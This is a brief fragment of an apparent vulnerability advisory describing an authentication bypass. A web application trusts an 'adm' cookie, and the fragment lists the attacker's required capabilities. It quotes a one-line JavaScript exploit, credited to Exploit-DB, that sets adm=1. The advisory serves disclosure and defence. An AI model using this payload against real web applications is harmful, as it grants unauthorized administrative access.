**6. Required Attacker Capabilities/Position:**
- **Basic Web Knowledge:** The attacker needs to understand how to manipulate HTTP cookies using JavaScript.
- **Target System Access:** The attacker must be able to send a manipulated "adm" cookie to the vulnerable web application.

**Technical Details (From Exploit-DB):**

- The provided exploit demonstrates how to set the "adm" cookie to "1" using JavaScript:
```javascript
javascript:document.cookie = "adm=1; path=/"; document.cookie = "adm=1; path=/";
```
- This highlights the direct manipulation of the cookie to bypass authentication.

**Additional Notes**
